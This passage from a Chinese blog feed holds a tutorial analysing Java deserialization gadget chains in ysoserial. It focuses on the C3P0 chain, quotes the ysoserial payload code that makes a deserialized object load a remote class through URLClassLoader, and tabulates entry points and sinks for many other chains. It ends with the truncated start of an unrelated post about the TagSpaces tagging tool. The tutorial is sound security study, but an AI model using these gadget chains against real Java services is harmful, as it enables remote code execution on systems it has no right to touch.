class="built_in">this</span>.getMethods.iterator();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> (Method)var2.next();</span><br><span class="line">            object = m.invoke(object);  <span class="comment">// 反射调用封装对象指定属性的 getter 方法</span></span><br><span class="line">        &#125; <span class="keyword">while</span>(object != <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MethodException</span>(<span class="built_in">this</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><blockquote><p>C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有 Hibernate、Spring 等。</p></blockquote><p>适用版本</p><ul><li>c3p0:0.9.5.2</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    PoolBackedDataSourceBase.readObject()</span><br><span class="line">        ReferenceIndirector.getObject()</span><br><span class="line">            ReferenceableUtils.referenceToObject()</span><br><span class="line">                Class.forName0()</span><br><span class="line">                    URLClassLoader.loadClass()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/mcCvQJ2HSIz7jFt.png" ><p>PoolBackedDataSourceBase 类中储存了 PropertyChangeSupport 和 VetoableChangeSupport 对象，用于支持监听器的功能。</p><p>这个类在序列化和反序列化时，要保存内部的 ConnectionPoolDataSource 成员变量，如果 connectionPoolDataSource 本身是不可序列化的对象，则使用 ReferenceIndirector 对其进行引用的封装，返回一个可以被序列化的 IndirectlySerialized 实例对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoolBackedDataSourceBase</span> <span class="keyword">extends</span> <span class="title class_">IdentityTokenResolvable</span> <span class="keyword">implements</span> <span class="title class_">Referenceable</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">PropertyChangeSupport</span> <span class="variable">pcs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyChangeSupport</span>(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">VetoableChangeSupport</span> <span class="variable">vcs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VetoableChangeSupport</span>(<span class="built_in">this</span>);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        oos.writeShort(<span class="number">1</span>);</span><br><span class="line">        ReferenceIndirector indirector;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SerializableUtils.toByteArray(<span class="built_in">this</span>.connectionPoolDataSource);</span><br><span class="line">            oos.writeObject(<span class="built_in">this</span>.connectionPoolDataSource); <span class="comment">// 保存成员变量</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotSerializableException var9) &#123;   <span class="comment">// 如果该成员变量不可序列化</span></span><br><span class="line">            MLog.getLogger(<span class="built_in">this</span>.getClass()).log(MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, var9);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                indirector = <span class="keyword">new</span> <span class="title class_">ReferenceIndirector</span>(); <span class="comment">// 使用 ReferenceIndirector 封装</span></span><br><span class="line">                oos.writeObject(indirector.indirectForm(<span class="built_in">this</span>.connectionPoolDataSource));    <span class="comment">// 返回 IndirectlySerialized</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var7;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + var8.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>indirectForm 方法中调用会调用 ConnectionPoolDataSource 的 getReference 方法返回一个 Reference 对象，并使用 ReferenceSerialized 对象对其封装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">var2</span> <span class="operator">=</span> ((Referenceable)var1).getReference();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceIndirector</span>.ReferenceSerialized(var2, <span class="built_in">this</span>.name, <span class="built_in">this</span>.contextName, <span class="built_in">this</span>.environmentProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoolBackedDataSourceBase 类在反序列化时，调用 IndirectlySerialized#getObject 方法重新生成 ConnectionPoolDataSource 对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> ois.readShort();</span><br><span class="line">    <span class="keyword">switch</span>(version) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();  <span class="comment">// 这里</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource)o;</span><br><span class="line">        <span class="built_in">this</span>.dataSourceName = (String)ois.readObject();</span><br><span class="line">        o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.extensions = (Map)o;</span><br><span class="line">        <span class="built_in">this</span>.factoryClassLocation = (String)ois.readObject();</span><br><span class="line">        <span class="built_in">this</span>.identityToken = (String)ois.readObject();</span><br><span class="line">        <span class="built_in">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line">        <span class="built_in">this</span>.pcs = <span class="keyword">new</span> <span class="title class_">PropertyChangeSupport</span>(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.vcs = <span class="keyword">new</span> <span class="title class_">VetoableChangeSupport</span>(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceSerialized#getObject 调用 InitialContext#lookup 方法尝试使用 JNDI 来获取相应的对象，在 contextName、env 均为空的情况下，则调用 ReferenceableUtils.referenceToObject() 使用 Reference 中的信息来获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext var1;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.env == <span class="literal">null</span>) &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var1 = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(<span class="built_in">this</span>.env);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.contextName != <span class="literal">null</span>) &#123;</span><br><span class="line">            var2 = (Context)var1.lookup(<span class="built_in">this</span>.contextName);  <span class="comment">// JNDI 获取对象</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Reference 获取对象</span></span><br><span class="line">        <span class="keyword">return</span> ReferenceableUtils.referenceToObject(<span class="built_in">this</span>.reference, <span class="built_in">this</span>.name, var2, <span class="built_in">this</span>.env);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) &#123;</span><br><span class="line">            ReferenceIndirector.logger.log(MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + var3.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceableUtils#referenceToObject 中使用 URLClassLoader 从 URL 中加载了类并实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">(Reference var0, Name var1, Context var2, Hashtable var3)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var0.getFactoryClassName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> var0.getFactoryClassLocation();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">var6</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">            var6 = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        Object var7;</span><br><span class="line">        <span class="keyword">if</span> (var11 == <span class="literal">null</span>) &#123;</span><br><span class="line">            var7 = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 URLClassLoader 从 URL 中加载了类并实例化</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(var11);</span><br><span class="line">            var7 = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;var8&#125;, var6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> Class.forName(var4, <span class="literal">true</span>, (ClassLoader)var7);</span><br><span class="line">        <span class="type">ObjectFactory</span> <span class="variable">var9</span> <span class="operator">=</span> (ObjectFactory)var12.newInstance();</span><br><span class="line">        <span class="keyword">return</span> var9.getObjectInstance(var0, var1, var2, var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isLoggable(MLevel.FINE)) &#123;</span><br><span class="line">            logger.log(MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">        var5.setRootCause(var10);</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.C3P0#PoolSource 不可序列化的并且实现了 Referenceable 的 ConnectionPoolDataSource 对象，并且其 getReference 方法返回恶意类位置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">PoolSource</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PoolSource</span> <span class="params">( String className, String url )</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.className = className;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Reference <span class="title function_">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;exploit&quot;</span>, <span class="built_in">this</span>.className, <span class="built_in">this</span>.url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span> <span class="params">( <span class="type">int</span> seconds )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.C3P0#getObject 构造恶意 URL 作为 PoolSource 对象的实例化参数，进一步将 PoolBackedDataSource 对象的 connectionPoolDataSource 指向恶意的 PoolSource。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造 url</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化 PoolBackedDataSource</span></span><br><span class="line">    <span class="type">PoolBackedDataSource</span> <span class="variable">b</span> <span class="operator">=</span> Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">    Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> <span class="title class_">PoolSource</span>(className, url));</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table><thead><tr><th>名称</th><th>入口点（kick-off）</th><th>调用链（chain）</th><th>触发点（sink）</th></tr></thead><tbody><tr><td>URLDNS</td><td>HashMap</td><td></td><td>URL</td></tr><tr><td>Commons Collections 1</td><td>AnnotationInvocationHandler</td><td>LazyMap&#x2F;TransformedMap</td><td>Transformer</td></tr><tr><td>Commons Collections 2</td><td>PriorityQueue</td><td>TransformingComparator</td><td>Transformer&#x2F;TemplatesImpl</td></tr><tr><td>Commons Collections 3</td><td>AnnotationInvocationHandler</td><td>LazyMap + Transformer + TrAXFilter</td><td>TemplatesImpl</td></tr><tr><td>Commons Collections 4</td><td>PriorityQueue&#x2F;TreeBag</td><td>TransformingComparator + Transformer + TrAXFilter</td><td>TemplatesImpl</td></tr><tr><td>Commons Collections 5</td><td>BadAttributeValueExpException</td><td>TiedMapEntry + LazyMap</td><td>Transformer</td></tr><tr><td>Commons Collections 6</td><td>HashMap&#x2F;HashSet</td><td>TiedMapEntry + LazyMap</td><td>Transformer</td></tr><tr><td>Commons Collections 7</td><td>Hashtable</td><td>TiedMapEntry + LazyMap</td><td>Transformer</td></tr><tr><td>Commons Beanutils</td><td>PriorityQueue</td><td>BeanComparator + CaseInsensitiveComparator</td><td>TemplatesImpl</td></tr><tr><td>Spring1</td><td>AnnotationInvocationHandler</td><td>MethodInvokeTypeProvider + TypeProvider +ObjectFactoryDelegatingInvocationHandler + AnnotationInvocationHandler</td><td>TemplatesImpl</td></tr><tr><td>Spring2</td><td>AnnotationInvocationHandler</td><td>MethodInvokeTypeProvider + TypeProvider + JdkDynamicAopProxy + AnnotationInvocationHandler</td><td>TemplatesImpl</td></tr><tr><td>Hibernate1</td><td>HashMap</td><td>TypedValue + PojoComponentTuplizer + GetterMethodImpl&#x2F;BasicGetter</td><td>TemplatesImpl</td></tr><tr><td>Hibernate2</td><td>HashMap</td><td>TypedValue + PojoComponentTuplizer + GetterMethodImpl&#x2F;BasicGetter</td><td>JdbcRowSetImpl</td></tr><tr><td>Groovy1</td><td>AnnotationInvocationHandler</td><td>ConvertedClosure</td><td>MethodClosure</td></tr><tr><td>FileUpload1</td><td>DiskFileItem</td><td></td><td>DeferredFileOutputStream</td></tr><tr><td>Wicket1</td><td>DiskFileItem</td><td></td><td>DeferredFileOutputStream</td></tr><tr><td>MozillaRhino1</td><td>BadAttributeValueExpException</td><td>NativeError + NativeJavaMethod + NativeJavaObject + MemberBox</td><td>TemplatesImpl</td></tr><tr><td>MozillaRhino2</td><td>NativeJavaObject</td><td>JavaAdapter + NativeJavaArray + Environment + JavaMembers</td><td>TemplatesImpl</td></tr><tr><td>Myfaces1</td><td>HashMap</td><td>ValueExpressionMethodExpression</td><td>ValueExpression</td></tr><tr><td>Myfaces2</td><td>HashMap</td><td>ValueExpressionMethodExpression</td><td>ValueExpression</td></tr><tr><td>ROME1</td><td>HashMap</td><td>ObjectBean + EqualsBean + ToStringBean</td><td>TemplatesImpl</td></tr><tr><td>BeanShell1</td><td>PriorityQueue</td><td>XThis$Handler + This</td><td>BshMethod</td></tr><tr><td>C3P0</td><td>PoolBackedDataSourceBase</td><td>ReferenceIndirector + ReferenceableUtils</td><td>URLClassLoader</td></tr><tr><td>Clojure1</td><td>HashMap</td><td>AbstractTableModel$ff19274a + clojure.core$comp$fn__4727 + clojure.core$constantly$fn__4614 + clojure.main$eval_opt + clojure.core$eval</td><td>Compiler</td></tr><tr><td>Click1</td><td>PriorityQueue</td><td>Column$ColumnComparator + PropertyUtils</td><td>TemplatesImpl</td></tr><tr><td>Vaadin1</td><td>BadAttributeValueExpException</td><td>PropertysetItem + NestedMethodProperty</td><td>TemplatesImpl</td></tr><tr><td>AspectJWeaver</td><td>HashSet</td><td>TiedMapEntry + LazyMap</td><td>SimpleCache$StorableCachingMap</td></tr><tr><td>Jython</td><td>PriorityQueue</td><td>Comparator + XThis$Handler + PyFunction</td><td>PyBytecode</td></tr><tr><td>JavassistWeld</td><td>InterceptorMethodHandler</td><td>SimpleInterceptionChain + SimpleMethodInvocation</td><td>TemplatesImpl</td></tr><tr><td>JBossInterceptors</td><td>InterceptorMethodHandler</td><td>SimpleInterceptionChain + SimpleMethodInvocation</td><td>TemplatesImpl</td></tr></tbody></table><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://www.anquanke.com/post/id/201762">JAVA反序列化-ysoserial-URLDNS</a></li><li><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></li><li><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3">Security Advisory – Java SE</a></li><li><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></li><li><a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">java反序列化工具ysoserial分析</a></li><li><a href="http://www.cnblogs.com/tr1ple/p/12421157.html">java反序列化-ysoserial-调试分析总结篇(6)</a></li><li><a href="https://paper.seebug.org/1242">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></li><li><a href="https://paper.seebug.org/1723">Ysoserial Commons-Collections 利用链分析</a></li><li><a href="https://paper.seebug.org/1224/">Java 反序列化系列 ysoserial Jdk7u21</a></li><li><a href="https://paper.seebug.org/1171/">Java 反序列化系列 ysoserial Groovy 1</a></li><li><a href="https://medium.com/@m01e/ysoserial-groovy1%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-2d53f197efc4">ysoserial Groovy1模块分析</a></li><li><a href="https://www.secpulse.com/archives/166957.html">Ysoserial Click1利用链分析</a></li><li><a href="https://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/">Java 反序列化之 CommonsBeanUtils 分析</a></li><li><a href="https://www.buaq.net/go-21093.html">ysoserial – Clojure分析</a></li><li><a href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">ROME 反序列化分析</a></li><li><a href="https://su18.org/post/ysuserial/">Java 反序列化取经路</a></li></ul>]]></content>
    
    
    <summary type="html">Java 反序列化漏洞入门，梳理 ysoserial 中的 POC</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>文件标签工具 TagSpaces 使用</title>
    <link href="https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/</id>
    <published>2021-09-09T06:10:54.000Z</published>
    <updated>2022-03-10T06:30:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩 mod 下载了一大堆材质文件和动作文件，但是下载的文件并没有按照网站上的 id 统一文件夹名称，结果就是各种各样的文件夹名称，完全看不出来内容到底是什么，而且也不知道某些种族能不能用…</p><p><img src="https://i.loli.net/2021/09/09/HrSD3Rj9g7Ew4Wq.png" style="zoom:80%;" /> <br /></p><p>后来是打算直接爬 <a href="https://www.xivmodarchive.com/">ffxivmodarchive</a> 网站上的 mod 信息，然后在本地浏览，提供预览、是否已下载和其他各种标签（种族、性别等）。但是做一半发现有点做不动（<a href="https://github.com/jckling/ffxiv-modarchive">jckling&#x2F;ffxiv-modarchive</a>）：① 需要每天同步网站上的数据；② 下载地址可能外链到谷歌云端硬盘，需要手动将保存的文件夹名称改为 id；③ 前端展示页面不好写。</p><p>四舍五入上面的功能就是“反向代理”加一个是否已下载的记录而已，做起来好麻烦于是搁置了（摊手</p><p>昨天花了点时间找打标签的工具，有一个 <a href="https://github.com/files-community/Files">Files</a> 文件浏览工具支持打标签，但是从微软应用商店里下载的是 1.x 版本，暂不支持标签功能 😅。其他的有 <a href="https://www.tagflow.ch/en/">TagFlow</a>、<a href="https://alltags.net/">allTags</a>、<a href="https://www.tagspaces.org/">TagSpaces</a>、<a href="https://www.taglyst.com/">tagLyst</a>，直接根据 UI 的喜好选了 TagSpaces 用，功能也是够的。</p><h1 id="TagSpaces"><a href="#TagSpaces" class="headerlink" title="TagSpaces"></a>TagSpaces</h1><p>跨平台打标签工具，支持对文件和文件夹打标签、加注解；支持文本搜索和标签搜索（布尔运算）；集成预览和编辑功能。</p><p>下载地址：</p><ul><li>官网：<a href="https://www.tagspaces.org/downloads/">https://www.tagspaces.org/downloads/</a></li><li>Github：<a href="https://github.com/tagspaces/tagspaces/releases">https://github.com/tagspaces/tagspaces/releases</a></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>从官网下载 